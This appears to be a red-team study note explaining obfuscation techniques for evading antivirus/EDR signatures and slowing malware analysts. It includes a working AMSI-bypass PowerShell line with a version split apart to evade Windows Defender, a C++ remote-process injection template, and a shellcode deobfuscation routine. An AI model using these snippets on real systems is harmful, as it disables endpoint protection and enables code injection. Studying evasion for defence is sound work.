---
{"dg-publish":true,"permalink":"/cards/red-team/obfuscation-principles/","tags":["red-team/host-evasion"]}
---

~ [[atlas/red-team\|red-team]]
### Introduction 
---
Obfuscation originated to protect software and intellectual property from being reproduced though adversaries have adapted it's use for malicious intent.

#### Key Topics
---
- [[#Origins of Obfuscation|Discusses how obfuscation began in IP protection and introduces a layered model of obfuscation from academic research.]]
    
- [[#Obfuscation's Function for Static Evasion|Explains how attackers evade static and heuristic AV/EDR signatures using techniques like data encoding, array transformation, and object concatenation.]]
    
- [[#Obfuscation's Function for Analysis Deception|Covers how to deceive human analysts using junk code, non-linear code flow, meaningless identifiers, and symbol stripping.]]
    
- [[#Control Flow|Introduces how arbitrary or indirect control flows and opaque predicates confuse static and dynamic analysis.]]
    
- [[#Protecting and Stripping Identifiable Information|Describes how attackers hide function names, object names, and compilation metadata to avoid detection or analysis.]]
    
- [[#Object Names|Shows how obfuscating variable/function/class names helps hide program logic, especially in interpreted languages like PowerShell or Python.]]
    
- [[#Code Structure|Outlines how junk code and reordered logic can obscure true behavior, especially in interpreters where analysts can see the full script.]]
    
- [[#File & Compilation Properties|Explains how compilation methods like debug builds can leak helpful information and how tools like strip remove them.]]
## Prerequisites

- [[cards/red-team/How Antivirus works and gets bypassed\|How Antivirus works and gets bypassed]]
- [[cards/red-team/Evading Antivirus - Shellcode\|Evading Antivirus - Shellcode]]

## Origins of Obfuscation
---
link: https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf

This research paper organizes obfuscation methods by layers:

![Obfuscation Principles.png|450](/img/user/cards/red-team/images/Obfuscation%20Principles.png)

Each sub-layer is then broken down into specific methods that can be achieve the overall objective of the sub-layer:

![Obfuscation Principles-1.png|550](/img/user/cards/red-team/images/Obfuscation%20Principles-1.png)

Supposed we want to obfuscate the layout of our code but cannot modify the existing code, in this case, we can inject junk code.

## Obfuscation's Function for Static Evasion
---
Two of the obstacles adversaries have to face are Antivirus engines and Endpoint Detectin & Response (EDR) solutions, both will leverage an extensive database of known signatures referred to as [[cards/red-team/How Antivirus works and gets bypassed#Detection Techniques\|static and heuristic signatures]].

To evade signatures adversaries abuse data obfuscation practices then applied it to the **code-element** layer:

![Obfuscation Principles-2.png|450](/img/user/cards/red-team/images/Obfuscation%20Principles-2.png)

- **Array Transformation** makes it harder to recognize predictable data patterns or offsets in memory.

	- Splitting it into smaller chunks
	- Merging multiple arrays into one
	- Folding it into multidimensional structures
	- Flattening nested arrays (for example: instead of 2D it becomes 1D only)

- **Data Encoding** prevents readable strings or static values from appearing in memory or binaries.

	- XOR, Caesar cipher, Base64
	- Custom math functions.

- **Data Procedurization** replaces static data such as strings or constants with function calls that generate the same data at runtime.

```C
char* getKey() { return "SecretKey"; } // or something more obfuscated
// Instead of: char* key = "SecretKey";
```

- **Data Splitting / Merging** hides full values and makes it harder to search for them or undestand their use.

	- Breaks a single value into smaller parts, stores them separately, then **reassembles** at runtime

```C
char part1[] = "Sec";
char part2[] = "ret";
char* key = strcat(part1, part2); // → "Secret"
```

See [[cards/red-team/Signature Evasion\|signature evasion]] and [[cards/red-team/Evading Antivirus - Shellcode#Encoding and Encryption\|evading antivirus]] start from encoding and encryption there.

### Object Concatenation
---
It is a common programing concept that combines two seperate objects into one object:

```python
A = "Hello"
B = "Pro"
C = A + B
print(C) # Hello Pro
```

In the research paper this is categorized in **data splitting/merging**, to a human this is obvious but to many **static analysis tools** or **antivirus engines**, this breaks the known signature because it doesn’t exactly match a static string like `"powershell"` in memory or in the binary.

Say a static signature:

```python
A = "Hello Pro"
```

This gets detected

```Python
amazing_world_of_gumball = "Hello Pro"
```

This does not:

```C
amazing_world_of_gumball = "Hello"
x = "Pro"
```

Additionally, attackers can also use **non-interpreted characters** to disrupt static signatures, this can be used independantly or with concatenation:

| **Character  <br>** | **Purpose  <br>**                                                     | **Example**                 |
| ------------------- | --------------------------------------------------------------------- | --------------------------- |
| Breaks              | Break a single string into multiple sub strings and combine them      | `('co'+'ffe'+'e')`          |
| Reorders            | Reorder a string’s components                                         | `('{1}{0}'-f'ffee','co')`   |
| Whitespace          | Include white space that is not interpreted                           | `.( 'Ne' +'w-Ob' + 'ject')` |
| Ticks               | Include ticks that are not interpreted                                | ``d`own`LoAd`Stri`ng``      |
| Random Case         | Tokens are generally not case sensitive and can be any arbitrary case | `dOwnLoAdsTRing`            |
##### Mini Challenge
---
Obfuscate the following:

```Powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

> [!warning]- solution and must read
> The idea is to break the code into parts and testing it in a similar environment which in this case is Windows Defender.
> 
> ```powershell
> $Value="SetValue"
> [Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'Init'+'Failed','No'+'nPublic,S'+'tatic').$Value($null,$true)
> ```

1. Break the code into parts (of course by breaking it apart the code should work on its own).
 2. Execute and see the result.
 3. Detected? obfuscate it, no? 
 4. Repeat step 1 to 3 for other parts.
## Obfuscation's Function for Analysis Deception
---
It may bypass software detection but this is still human readable this has a high chance of stopping our operation since they can easily read the code of our program.

This is under the code-element layer's sub layer **obfuscating layout** and **obfuscating controls** sub layers.

![Obfuscation Principles-3.png|450](/img/user/cards/red-team/images/Obfuscation%20Principles-3.png)

- **Junk codes** adds non functional instructions that do nothing or does something but not related to the malware at all.

- **Separation of Related Code** splits up logically connected operations and throws them throughout the code.
	- Makes program non-linear basically not top-down but top-top-bottom-top and so on..
	- Like a cooking recipe but this time step 1 is on page 1 step 2 is on page 90 and so on.
	- Often used in **malware loaders or droppers**. The decrypt key might be loaded 5 functions earlier, and only used in a branch that executes under certain conditions.

- **Stripping Redundant Symbols** removes symbols such as function names, variable names, and debugging symbols

	- In compiled programs, there are **labels** like: `connectToC2()` or `adminPassword` stripping symbols would result into Ghidra or IDA seeing: `sub_402AF3` instead.
	- Makes binary harder to analyze
	- Debuggers like Ghidra or IDA lose helpful naming context.

- **Meaningless Identifiers** renames variables, functions, or classes to meaningless names such as abc, zzz, 1232sdda22 or idk.
	- Makes reverse engineering tedious and confusing.

- **Implicit Controls**  converts direct, obvious control instructions into **indirect or hidden flows**.

	- Makes control flow **less predictable or traceable**.

```C
if (loggedIn) launchBackdoor();
```

You might get:

```C
int index = loggedIn + 0x1234;
((void(*)())dispatchTable[index])(); // dispatchTable acts like the command center, it decides what func to execute under certain conditions.
```

- **Bogus Control Flows** add fake or dead control paths - or codes that never gets executed but make the program look more complex.

	- Waste time for analysts and reverse engineer.
	- such as `runMaliciousCode()` obviously something this obvious in a obfuscated code will not fool any analyst so the idea is to make the code 'shiny' at the same time won't be easily flag as useless by the analyst

Read [[cards/red-team/Sandbox Evasion\|sandbox evasion]] for more info about anti-analysis and anti-reversing.

## Control Flow
---
An analyst can attempt to understand a program's function through it's control flow, a program will traditionally execute from the top-down but when a **logic** statement is encountered; it is not a top-down approach but to where the code is located.

The goal is to **add enough obscurity and arbitrary logic** to confuse the analyst, add more then it can be easily flagged or detected by platforms as malicious.
### Arbitrary Control Flow Patterns
---
Crafting arbitrary control flow patterns requires math, logic, and/or other complex algorithms to inject a different control flow into a malicious function basically making the execution path **look different** while still doing the **same malicious thing**

Normal one:

```C
void runTask(int task) {
    if (task == 1) {
        doTask1();
    } else if (task == 2) {
        doTask2();
    } else if (task == 3) {
        doTask3();
    }
}
```

Obfuscated one:

```C
void (*dispatchTable[3])() = {doTask1, doTask2, doTask3};

void runTask(int task) {
    int index = (task * 17) % 3;  // Arbitrary math to confuse analysts
    void (*func)() = dispatchTable[index];
    func();  // Indirect call
}
```

Malware analysts now have to:

- Understand the math (`task * 17 % 3`) to know the flow.
- Track **function pointers**, not clear function names.

_Opaque Predicate_ is a condition (like an if statement) that the attacker already knows will always be true (or false), but makes it look unpredictable to outsiders.

**Why Use Opaque Predicates?**

- For the analyst: it looks like the program might go in different directions — but in reality, it always goes the same way.
- Used to **add fake logic** (bogus paths) that make analysis **longer and harder**.
- Helps hide the **real logic** of the program.
- Works well with junk code, fake variables, etc.
#### Collatz Conjecture Example
---
Using a math trick as a predicate:

```python
x = 0
while(x > 1):
	if(x % 2 == 1):
		x = x * 3 + 1
	else:
		x = x / 2
	if(x == 1):
		print("hello!")
```

1. Set the value to of `x` to zero.
2. `while` loop: this means: _'Run the following block of code as long as `x` is greater than 1'_. Since `x` is zero, this condition is false, so the code won't run at all.
	- So as long as `x` is smaller than 1 this code block won't run at all.

- If you input any **positive number**, the **Collatz logic will eventually always reach 1**. (not related to the code snippet above but same point)
- So even though it looks **complex**, you **already know the output will be 1**.
- That makes it a perfect **opaque predicate** — looks hard to analyze, but result is always predictable.

## Protecting and Stripping Identifiable Information
---
Limiting the amount of identifiable information (variables, function names, etc.), gives a better chance an analyst won't be able to reconstruct it's original function.

- code structure
- object names
- file/compilation properties.
### Object Names
---
These are variable names `shellcode` or `processHandle`, function names `Get-Hack1` or `Get-Hack2`, class names, struct names, and module names.

Basically names that are hints to what a program does, for example a variable named `CreditCardNumber` then you instantly know what value its holding.

In C# (a compiled binary) Instead of this -- [[cards/red-team/Obfuscation Principles Object Name Code\|Obfuscation Principles Object Name Code]]:  (Code 1)

```C
string leaked = "This was leaked in the strings";
```

An attacker might use [[cards/red-team/Obfuscation Principles Object Name Code#obfuscated Code 2\|Obfuscated code 2]]:

```C
string x5g8n = "abcdefg";
```

In this way, if analyst used `strings` (a tool used to output all human readable text in binaries) will output `abcdefg` this is meaningless.

After compiling, the CPU only cares about memory addresses and instructions — variable names are irrelevant unless:

- The program is compiled **with debugging symbols** (`-g` in gcc), and
- The binary is not **stripped** (e.g., `strip` command used to remove debug info).

#### Compiled vs Interpreted Language Differences

**Compiled (like C/C++/C#):**

- Once compiled, **only things written to Input/Ouput** (like console output or strings) can be seen.
- **Variable names disappear** unless they're referenced in strings. (e.g quoted text)

**Interpreted (like PowerShell/Python):**

- **Variable names stay** — because the script is just text.
- Every function and variable name is visible unless obfuscated manually.
    
**So in Python/PowerShell**, you **must rename all variables** to confuse analyst. In compiled languages, it's less critical but still helpful.
##### But why not obfuscate everything?

If you go too hard, like renaming `Write-Host` to a 20-character base64-looking string, you:

- Trigger **EDR/AV entropy alerts** — too much randomness = suspicious.
- Make your script **stand out in logs**.

Instead, attackers will **selectively obfuscate**:

- Keep common cmdlets like `Write-Host`, `Invoke-WebRequest` as-is
- Obfuscate key logic functions and variables

Script still flies under the radar while still being confusing to analyze.

```C
[Byte[]] $KooG5 = @(0x38, 0x54, ...) // Obfuscated shellcode
...
function Get-Robf ($b3tz) { // A function to deobfuscate the shellcode
   $aisN = [System.Byte[]]::new($b3tz.Count)
   for ($x = 0; $x -lt $aisN.Count; $x++) {
      $aisN[$x] = ($b3tz[$x] + 21)
   }
   return [System.Text.Encoding]::ASCII.GetString($aisN)
}
```

The above effectively obfuscate from static analysis: So unless you reverse the byte arithmetic and decode it, you **won’t know what it’s calling**.

### Code Structure
---
Poor or predictable structure—whether in interpreted or compiled languages can lead to easier detection through static signatures or simplify reverse engineering for analyst.

Techniques such as **junk code injection** and **code reordering** are commonly used to increase the complexity of interpreted programs. Since interpreted code is more transparent (not compiled), analysts have direct access to the source logic. Without artificial obfuscation, they can easily isolate and analyze malicious functions
### File & Compilation Properties
---
Though often considered as minor detail, the compilation method could help analyst during reverse engineering, such as if a program is compiled as a [[cards/red-team/Obfuscation Principles Object Name Code\|debug build]], it may include symbol information that reveals **global variables**, **function names**, **entry points**, and more.

Strip this:

```powershell
#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
	unsigned char shellcode[] = "";

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	string leaked = "This was leaked in the strings";

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	cout << "Handle obtained for" << processHandle;
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	cout << "Buffer Created";
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	cout << "Process written with buffer" << remoteBuffer;
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	cout << "Closing handle" << processHandle;
	cout << leaked;

	return 0;
} 
```

Compile in linux:

```C
x86_64-w64-mingw32-g++ c.cpp -o myprogram.exe
```

If binary is already compiled with debug symbols
```C
strip myprog
```
### Questions and Problems
---
## Conclusion



